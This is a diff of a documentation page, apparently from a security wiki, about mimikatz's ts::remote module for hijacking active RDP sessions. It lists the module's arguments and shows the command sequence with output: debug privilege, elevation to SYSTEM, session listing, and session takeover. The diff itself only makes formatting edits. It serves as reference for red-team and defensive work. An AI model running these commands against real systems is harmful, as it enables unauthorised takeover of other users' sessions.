@@ -1,17 +1,17 @@
 # remote
 
-This module can be used to perform RDP takeover/hijacking of active sessions. It has the following arguments:
+`ts::remote` can be used to perform RDP takeover/hijacking of active sessions. It has the following arguments:
 
 * `/id`: The active RDP session id to hijack. It can be found with [`ts::sessions`](sessions.md).
 * `/target`: It connects another session to the target ID, not your own/current session.
 * `/password`: The password of the target RDP user. It is not required when running as `NT AUTHORITY\SYSTEM`.
 
-```text
+```
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
-```text
+```
 mimikatz # token::elevate
 Token Id  : 0
 User name :
@@ -24,7 +24,7 @@ SID name  : NT AUTHORITY\SYSTEM
  * Thread Token  : {0;000003e7} 0 D 30503948    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
 ```
 
-```text
+```
 mimikatz # ts::sessions
 
 Session: 1 - RDP-Tcp#0
@@ -49,7 +49,7 @@ Session: *2 - RDP-Tcp#2
   addr4: 192.168.0.92
 ```
 
-```text
+```
 mimikatz # ts::remote /id:1
 Asking to connect from 3 to current session
 
@@ -60,5 +60,4 @@ Asking to connect from 3 to current session
 Experiments showed the `ts::remote`, even running as `SYSTEM`, was not working against _Windows Server 2019 Standard 1809, OS Build 17763.737_. The password of the user to takeover was requested.
 {% endhint %}
 
-_\(Demonstration target is a Windows Server 2016 Essentials\)_
-
+_(Demonstration target is a Windows Server 2016 Essentials)_
